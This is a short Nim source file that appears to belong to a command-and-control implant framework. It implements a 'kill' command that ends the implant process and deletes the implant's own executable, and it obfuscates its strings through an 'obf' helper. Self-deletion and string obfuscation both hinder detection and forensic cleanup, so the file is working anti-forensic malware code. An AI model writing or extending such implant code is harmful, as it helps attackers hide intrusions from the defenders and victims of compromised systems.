import os, strutils
import ../../util/strenc

proc kill*(args: seq[string]): string =
    # Kill command - terminate the implant process and attempt self-deletion
    when defined verbose:
        echo obf("Executing kill command - terminating implant")
    
    try:
        # Return success message before terminating
        result = obf("Implant terminating...")
        
        # Attempt self-deletion (works on Linux/macOS, fails silently on Windows)
        try:
            let exePath = getAppFilename()
            when defined verbose:
                echo obf("DEBUG: Attempting self-deletion: ") & exePath
            
            removeFile(exePath)
            
            when defined verbose:
                echo obf("DEBUG: Self-deletion successful")
        except:
            # Ignore deletion errors (e.g., file locked on Windows)
            when defined verbose:
                echo obf("DEBUG: Self-deletion failed (file may be locked), continuing with exit")
        
        # Exit the process immediately
        quit(0)
        
    except:
        let msg = getCurrentExceptionMsg()
        result = obf("ERROR: Failed to terminate implant.\nException: ") & msg
